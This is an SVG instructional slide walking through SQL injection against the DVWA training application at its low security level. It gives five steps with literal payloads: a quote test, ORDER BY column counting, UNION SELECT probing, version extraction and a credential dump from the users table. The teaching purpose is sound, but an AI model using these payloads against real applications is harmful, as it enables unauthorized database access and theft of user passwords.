<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720" style="background:var(--bg)">
  <metadata>
    <type>regular</type>
  </metadata>
  <defs>
    <style id="palette-vars">
      :root, svg {
        --bg: #ffffff;
        --surface: #c4cdd6;
        --border: #6b7280;
        --text: #212121;
        --text-muted: #555555;
        --text-faint: #888888;
        --code-bg: #1a1a2e;
        --shadow: #00000044;
        --black: #000000;
        --primary-fill: #5a7a9c;
        --primary-border: #3d5a7d;
        --primary-text: #ffffff;
        --primary-accent: #243b59;
        --ok-fill: #7a9a6a;
        --ok-border: #5a7a4d;
        --ok-text: #ffffff;
        --ok-accent: #385030;
        --warn-fill: #c8924a;
        --warn-border: #9c6e2e;
        --warn-text: #ffffff;
        --warn-accent: #5a3f12;
        --danger-fill: #a86058;
        --danger-border: #7d3f38;
        --danger-text: #ffffff;
        --danger-accent: #4a1f1a;
        --info-fill: #7c6a8e;
        --info-border: #574a68;
        --info-text: #ffffff;
        --info-accent: #2f253b;
      }
    </style>
    <!-- Gradients -->
    <linearGradient id="grad-primary" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#7493b3"/>
      <stop offset="100%" stop-color="#3d5a7d"/>
    </linearGradient>

    <linearGradient id="grad-surface" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ffffff"/>
      <stop offset="100%" stop-color="#c4cdd6"/>
    </linearGradient>

    <linearGradient id="grad-ok" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#94b384"/>
      <stop offset="100%" stop-color="#5a7a4d"/>
    </linearGradient>

    <linearGradient id="grad-warn" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#dba868"/>
      <stop offset="100%" stop-color="#9c6e2e"/>
    </linearGradient>

    <linearGradient id="grad-danger" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#bd7d75"/>
      <stop offset="100%" stop-color="#7d3f38"/>
    </linearGradient>

    <linearGradient id="grad-info" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#9384a5"/>
      <stop offset="100%" stop-color="#574a68"/>
    </linearGradient>

    <!-- Drop shadow -->
    <filter id="shadow" x="-4%" y="-8%" width="108%" height="124%">
      <feDropShadow dx="0" dy="4" stdDeviation="8" flood-color="#00000044"/>
    </filter>

    <!-- Arrow markers -->
    <marker id="arrow" markerWidth="14" markerHeight="14" refX="11" refY="6" orient="auto" markerUnits="userSpaceOnUse">
      <path d="M0,0 L12,6 L0,12 L3,6 Z" fill="#243b59"/>
    </marker>
    <marker id="arrow-primary" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#3d5a7d"/>
    </marker>
    <marker id="arrow-ok" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#5a7a4d"/>
    </marker>
    <marker id="arrow-warn" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#9c6e2e"/>
    </marker>
    <marker id="arrow-danger" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#7d3f38"/>
    </marker>
    <marker id="arrow-info" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#574a68"/>
    </marker>
    <marker id="arrow-white" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
    </marker>
  </defs>
  <text x="1240" y="40" font-size="37.714564" font-weight="bold" fill="var(--text)" text-anchor="middle" font-family="Arial, sans-serif">DVWA SQL Injection — Step-by-Step (Security: Low)</text>
  <text x="1240" y="81.760003" font-size="29.632804" fill="var(--text-muted)" text-anchor="middle" font-family="Courier New, monospace">URL: /vulnerabilities/sqli/?id=1&amp;Submit=Submit</text>
  <rect x="40" y="114.240045" width="116.129123" height="69.600005" fill="var(--primary-accent)" rx="9.590317"/>
  <text x="98.064667" y="160.639968" font-size="37.714564" font-weight="bold" fill="var(--bg)" text-anchor="middle" font-family="Arial, sans-serif">1</text>
  <text x="194.838758" y="146.719967" font-size="35.020644" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Test for injection</text>
  <text x="194.838758" y="181.51997" font-size="29.632804" fill="var(--danger-accent)" font-family="Courier New, monospace">id=1'  →  Error (injectable!)</text>
  <rect x="40" y="216.319972" width="116.129123" height="69.600005" fill="var(--primary-accent)" rx="9.590317"/>
  <text x="98.064667" y="262.720015" font-size="37.714564" font-weight="bold" fill="var(--bg)" text-anchor="middle" font-family="Arial, sans-serif">2</text>
  <text x="194.838758" y="248.800014" font-size="35.020644" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Determine number of columns</text>
  <text x="194.838758" y="283.600017" font-size="29.632804" fill="var(--text-muted)" font-family="Courier New, monospace">id=1' ORDER BY 2-- -  →  Works  |  ORDER BY 3  →  Error  (2 columns)</text>
  <rect x="40" y="327.67998" width="116.129123" height="69.600005" fill="var(--primary-accent)" rx="9.590317"/>
  <text x="98.064667" y="374.080023" font-size="37.714564" font-weight="bold" fill="var(--bg)" text-anchor="middle" font-family="Arial, sans-serif">3</text>
  <text x="194.838758" y="360.160022" font-size="35.020644" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Find display columns</text>
  <text x="194.838758" y="394.960024" font-size="29.632804" fill="var(--text-muted)" font-family="Courier New, monospace">id=' UNION SELECT 1,2-- -  →  Shows "1" and "2" on page</text>
  <rect x="40" y="439.039988" width="116.129123" height="69.600005" fill="var(--primary-accent)" rx="9.590317"/>
  <text x="98.064667" y="485.440031" font-size="37.714564" font-weight="bold" fill="var(--bg)" text-anchor="middle" font-family="Arial, sans-serif">4</text>
  <text x="194.838758" y="471.52003" font-size="35.020644" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Extract DB version</text>
  <text x="194.838758" y="506.320032" font-size="29.632804" fill="var(--text-muted)" font-family="Courier New, monospace">id=' UNION SELECT 1,@@version-- -</text>
  <rect x="40" y="550.399995" width="116.129123" height="69.600005" fill="var(--danger-accent)" rx="9.590317"/>
  <text x="98.064667" y="596.800038" font-size="37.714564" font-weight="bold" fill="var(--bg)" text-anchor="middle" font-family="Arial, sans-serif">5</text>
  <text x="194.838758" y="582.880037" font-size="35.020644" font-weight="bold" fill="var(--danger-accent)" font-family="Arial, sans-serif">Dump user credentials</text>
  <text x="194.838758" y="617.68004" font-size="29.632804" fill="var(--danger-accent)" font-family="Courier New, monospace">id=' UNION SELECT user,password FROM users-- -</text>
</svg>
